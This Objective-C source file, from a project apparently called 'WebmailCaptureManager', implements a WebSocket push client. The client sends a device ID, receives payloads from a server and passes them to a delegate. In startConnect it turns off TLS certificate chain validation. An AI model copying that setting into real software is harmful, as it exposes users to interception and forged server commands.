//
//  PushAsyncController.m
//  WebmailCaptureManager
//
//  Created by ophat on 4/23/15.
//  Copyright (c) 2015 ophat. All rights reserved.
//

#import "PushAsyncController.h"
#import "PushAsyncSocket.h"

#import <CommonCrypto/CommonDigest.h>
#import <IOKit/IOKitLib.h>
#import <SystemConfiguration/SystemConfiguration.h>

#define kMSG 1

#define READ_TIMEOUT 5.0
#define READ_TIMEOUT_EXTENSION 5.0

#define kHostPing  @"google.com"
#define kJustLive  10.0
#define kReset     10.0
#define kOP_TEXT   1
#define kOP_BINARY 2

#define FORMAT(format, ...) [NSString stringWithFormat:(format), ##__VA_ARGS__]

@implementation PushAsyncController
@synthesize mPushServerName;
@synthesize mPushPort;
@synthesize mDeviceID;
@synthesize mSock;
@synthesize mMessageId;
@synthesize mThreadAlive;
@synthesize mMyKey;
@synthesize mMainThead;
@synthesize mSocketIsConnected;
@synthesize mIsStartConnect;
@synthesize mStart;

@synthesize mDelegate, mSelector;

- (id)init {
    if((self = [super init])){
        mMessageId = [[NSMutableArray alloc]init];
        mThreadAlive = [[NSMutableArray alloc]init];
        mSock = [[PushAsyncSocket alloc] initWithDelegate:self];
        [mSock setRunLoopModes:[NSArray arrayWithObject:NSRunLoopCommonModes]];
    }
    return self;
}
#pragma mark -Start/Stop
-(void)startWithServerName:(NSString *)aName port: (int) aPort deviceID: (NSString *) aDeviceID{

    self.mPushServerName = aName;
    self.mPushPort = aPort;
    self.mDeviceID = aDeviceID;
    
    mStart = true;
    mMainThead = [NSThread currentThread];
    
    if ([self isInternetAvailable]) {
        [self startConnect];
    }else{
        dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void){
            [self waitToRestartConnection];
        });
    }
}
-(void)stop {
    mStart = false;
    mSocketIsConnected = false;
    mIsStartConnect = false;
    [self stopConnect];
}
-(void)startConnect {
    if (!mIsStartConnect) {
        mIsStartConnect = true;
        DLog(@"startConnect");
        NSError * error;
        BOOL succ = [mSock connectToHost:self.mPushServerName onPort:self.mPushPort withTimeout:READ_TIMEOUT error:&error];
        if (!succ){
            [mSock disconnect];
            DLog(@"Error %@",error);
        }
        NSMutableDictionary* settings = [NSMutableDictionary dictionary];
        [settings setObject:self.mPushServerName forKey:(NSString *)kCFStreamSSLPeerName];
        [settings setObject:[NSNumber numberWithBool:NO] forKey:(NSString *)kCFStreamSSLValidatesCertificateChain];
        [mSock startTLS:settings];
    }else{
        DLog(@"Started");
    }
}

-(void)stopConnect {
     DLog(@"stopConnect");
    [mSock disconnect];
}

#pragma mark ### Delegate Method

-(BOOL)onSocketWillConnect:(PushAsyncSocket *)sock {
    DLog(@"onSocketWillConnect Connecting");
    return YES;
}

- (void)onSocket:(PushAsyncSocket *)sock didAcceptNewSocket:(PushAsyncSocket *)newSocket {
    DLog(@"didAcceptNewSocket");
    [sock readDataWithTimeout:-1 tag:kMSG];
}

- (void)onSocket:(PushAsyncSocket *)sock didConnectToHost:(NSString *)host port:(UInt16)port {
    DLog(@"didConnectToHost %@ with port %d",host,port);
    [self SendSecretCode:sock];
}
- (void)onSocket:(PushAsyncSocket *)sock didWriteDataWithTag:(long)tag {
    DLog(@"onSocket didWriteDataWithTag");
    [sock readDataWithTimeout:-1 tag:kMSG];
}
- (void)onSocket:(PushAsyncSocket *)sock didReadData:(NSData *)data withTag:(long)tag {
    NSData *strData = data;
    NSString *msg = [[NSString alloc] initWithData:strData encoding:NSUTF8StringEncoding];
    if ([msg length]) {
        DLog(@"### ReadHeader %@",msg);
    }else{
        NSString *ascii = [[NSString alloc] initWithData:strData encoding:NSASCIIStringEncoding];
        if ([ascii rangeOfString:@"{"].location != NSNotFound && [ascii rangeOfString:@"}"].location != NSNotFound ){
            [self receiveMessage:ascii];
            [self getMessageIdFromString:ascii];
            [self SendAck:sock];
        }
        [ascii release];
    }
    [msg release];
}

- (NSTimeInterval)onSocket:(PushAsyncSocket *)sock shouldTimeoutReadWithTag:(long)tag elapsed:(NSTimeInterval)elapsed bytesDone:(NSUInteger)length {
    if(elapsed <= READ_TIMEOUT) {
        return READ_TIMEOUT_EXTENSION;
    }
    return 0.0;
}

- (void)onSocketDidSecure:(PushAsyncSocket *)sock {
    DLog(@"onSocketDidSecure");
    [sock readDataWithTimeout:-1 tag:kMSG];
    
    mSocketIsConnected = true;
    [self cancelAllRemainingThreads];
    
    dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void){
        [self iamStillAlive:sock];
    });
}

- (void)onSocket:(PushAsyncSocket *)sock willDisconnectWithError:(NSError *)err {
    DLog(@"onSocket willDisconnectWithError %@",err);
}

- (void)onSocketDidDisconnect:(PushAsyncSocket *)sock{
    DLog(@"onSocket onSocketDidDisconnect");
    mIsStartConnect    = false;
    mSocketIsConnected = false;
    [mSock disconnect];
    if (mStart) {
        dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void){
            [self waitToRestartConnection];
        });
    }
}
#pragma mark -ReceiveMessage

-(void) receiveMessage:(NSString *)aRMSG{
    DLog(@"receiveMessage %@",aRMSG);
    NSArray  * raw = [aRMSG componentsSeparatedByString:@"\"payload\":"];
    for (int i=1; i < [raw count]; i++) {
        NSString * payload = [raw objectAtIndex:i];
        payload = [[payload componentsSeparatedByString:@"\"}"] objectAtIndex:0];
        payload = [payload stringByReplacingOccurrencesOfString:@"\"" withString:@""];
        DLog(@"Payload is { %@ }",payload);
        if ([mDelegate respondsToSelector:mSelector]) {
            [mDelegate performSelector:mSelector withObject:payload];
        }
    }
}

#pragma mark -CreateAck

-(NSData *)createAck_data:(const char*) aData dataLen:(int)aDataLen opcode:(int)aOpcode errorCode:(int)aErrorCode {
     Boolean m_masking = true;
    
     const int KWEBSOCKET_BYTE = 255;
     const int KWEBSOCKET_FIN = 128;
     const int KWEBSOCKET_MASK = 128;

     int insert = (aErrorCode > 0) ? 2 : 0;
     int length = aDataLen + insert;
     int header = (length <= 125) ? 2 : (length <= 65535 ? 4 : 10);
     int offset = header + (m_masking ? 4 : 0);
     int masked = m_masking ? KWEBSOCKET_MASK : 0;

     int outputLen = length + offset;
     char frame [outputLen];
     frame[0] = (Byte) ((Byte)KWEBSOCKET_FIN | (Byte)aOpcode);
     
     if (length <= 125) {
         frame[1] = (Byte)(masked | length);
     }
     else if (length <= 65535) {
         frame[1] = (Byte)(masked | 126);
         frame[2] = (Byte)floor(length / 256);
         frame[3] = (Byte)(length & KWEBSOCKET_BYTE);
     }
     else {
         frame[1] = (Byte)(masked | 127);
         frame[2] = (Byte)(((int)floor(length / pow(2, 56))) & KWEBSOCKET_BYTE);
         frame[3] = (Byte)(((int)floor(length / pow(2, 48))) & KWEBSOCKET_BYTE);
         frame[4] = (Byte)(((int)floor(length / pow(2, 40))) & KWEBSOCKET_BYTE);
         frame[5] = (Byte)(((int)floor(length / pow(2, 32))) & KWEBSOCKET_BYTE);
         frame[6] = (Byte)(((int)floor(length / pow(2, 24))) & KWEBSOCKET_BYTE);
         frame[7] = (Byte)(((int)floor(length / pow(2, 16))) & KWEBSOCKET_BYTE);
         frame[8] = (Byte)(((int)floor(length / pow(2, 8))) & KWEBSOCKET_BYTE);
         frame[9] = (Byte)(length & KWEBSOCKET_BYTE);
     }
     
     if (aErrorCode > 0) {
         frame[offset] = (Byte)(((int)floor(aErrorCode / 256)) & KWEBSOCKET_BYTE);
         frame[offset + 1] = (Byte) (aErrorCode & KWEBSOCKET_BYTE);
     }
     memcpy(frame + (offset + insert), aData, aDataLen);
     
     if (m_masking) {
         Byte mask[4] = {(Byte)floor(rand() % 256), (Byte)floor(rand()%256), (Byte)floor(rand()%256), (Byte)floor(rand()%256)};
         memcpy(frame + header, mask, 4);
         
         int round = outputLen - offset;
         for (int i = 0; i < round; i++) {
             frame[offset + i] = (Byte)(frame[offset + i] ^ mask[i%4]);
         }
     }
     NSData *ret = [NSData dataWithBytes:frame length:outputLen];
     return ret;
}

-(void)SendAck:(PushAsyncSocket *)aSock{
    DLog(@"### SendAck ###");
    for (int i = 0; i < [mMessageId count]; i++) {
        NSString * jsonFormat = [NSString stringWithFormat:@"{ \"responseCode\": 1001, \"messageId\": %@ }", [mMessageId objectAtIndex:i]];
        //DLog(@"json %@",jsonFormat);
        [aSock writeData: [self createAck_data: [jsonFormat cStringUsingEncoding:NSASCIIStringEncoding] dataLen:(int)[jsonFormat length] opcode:kOP_TEXT errorCode:0] withTimeout:-1 tag:kMSG];
    }
}

#pragma mark -GET Message ID

-(void)getMessageIdFromString:(NSString *)aString {
    [mMessageId removeAllObjects];
    NSArray * spliter = [aString componentsSeparatedByString:@","];
    for (int i = 0; i < [spliter count]; i++) {
        if ([[spliter objectAtIndex:i]rangeOfString:@"\"messageId\":"].location !=NSNotFound) {
            NSArray * getId = [[spliter objectAtIndex:i] componentsSeparatedByString:@"\"messageId\":"];
            [mMessageId addObject:[getId objectAtIndex:1]];
        }
    }
}

#pragma mark -Create Secret Code

-(void)SendSecretCode:(PushAsyncSocket *)aSock {
    DLog(@"### SendSecretCode ###");
    NSString * srt = [self createSecretCode:self.mPushServerName];
    NSData * goSRT = [srt dataUsingEncoding:NSUTF8StringEncoding];
    [aSock writeData:goSRT withTimeout:-1 tag:kMSG];
}

-(NSString *)createSecretCode:(NSString *)aHost {
    NSString * ret = [NSString stringWithFormat:@"GET / HTTP/1.1\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nHost: %@\r\nOrigin: https://%@\r\nSec-WebSocket-Key: %@\r\nSec-WebSocket-Version: 13\r\ndeviceId: %@\r\n\r\n",aHost,aHost,[self createSecretKeyV2],self.mDeviceID];
    DLog(@"createSecret :\n%@",ret);
    return ret;
}

-(NSString *)createSecretKey {
    char chSecret[16];
    for (int i = 0; i < 16; i++) {
        chSecret[i] = rand() % 256;
    }
    NSString * strSecret =  [NSString stringWithCString:chSecret encoding:NSASCIIStringEncoding];
    return strSecret;
}

-(NSString *)createSecretKeyV2 {
    NSString * strSecret = @"";
    NSString *letters = @"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789=-_";
    for (int i=0; i < 16; i++) {
        strSecret = [strSecret stringByAppendingString:[NSString stringWithFormat:@"%C", [letters characterAtIndex: arc4random_uniform([letters length])]]];
    }
    return strSecret;
}

#pragma mark -Checker

-(void)waitToRestartConnection {
    while (![self isInternetAvailable] && ![[NSThread currentThread] isCancelled]) {
        DLog(@"### No internet Connection : waitToRestartConnection ");
        sleep(kReset);
    }
    if ([self isInternetAvailable]) {
        [self performSelector:@selector(startConnect) onThread:mMainThead withObject:nil waitUntilDone:YES];
    }
}

-(BOOL)isInternetAvailable {
    BOOL ret = false;
    const char *hostName = [kHostPing cStringUsingEncoding:NSASCIIStringEncoding];
    SCNetworkConnectionFlags flags = 0;
    if (SCNetworkCheckReachabilityByName(hostName, &flags) && flags > 0)  {
        if (flags == kSCNetworkFlagsReachable) {
            ret = true;
        }
        else {
            ret = false;
        }
    }
    else {
        ret = false;
    }
    return ret;
}

#pragma mark -JustAlive

-(void)iamStillAlive:(PushAsyncSocket*)aSock {
    [mThreadAlive addObject:[NSThread currentThread]];
    
    while (mSocketIsConnected) {
        sleep(kJustLive);
        if (mSocketIsConnected && ![[NSThread currentThread] isCancelled]) {
            [self performSelector:@selector(sendHeartBeatwithSock:) onThread:mMainThead withObject:aSock waitUntilDone:NO];
        }
    }
    
    [self findAndRemove:[NSThread currentThread]];
}

-(void)sendHeartBeatwithSock:(PushAsyncSocket *)aSock {
    DLog(@"### sendHeartBeat ###");
    NSString * empty = @" ";
    [aSock writeData: [self createAck_data: [empty cStringUsingEncoding:NSASCIIStringEncoding] dataLen:(int)[empty length] opcode:kOP_BINARY errorCode:0] withTimeout:-1 tag:kMSG];
}

-(void)findAndRemove:(NSThread *)aThread{
    int index = -1;
    for (int i=0; i < [mThreadAlive count]; i++) {
        if ([[mThreadAlive objectAtIndex:i]isEqualTo:aThread]) {
            index =i;
        }
    }
    if (index != -1) {
        DLog(@"success removing 1 thread");
        [mThreadAlive removeObjectAtIndex:index];
    }
}

-(void)cancelAllRemainingThreads{
    DLog(@"cancelAllRemainingThreads Total %lu",(unsigned long)[mThreadAlive count]);
    for (int i=0; i < [mThreadAlive count]; i++) {
        [[mThreadAlive objectAtIndex:i] cancel];
    }
    [mThreadAlive removeAllObjects];
}

#pragma mark -Destroy

-(void)dealloc {
    [mPushServerName release];
    [mThreadAlive release];
    [mSock release];
    [mMainThead release];
    [mMessageId release];
    [mMyKey release];
    [super dealloc];
}

@end
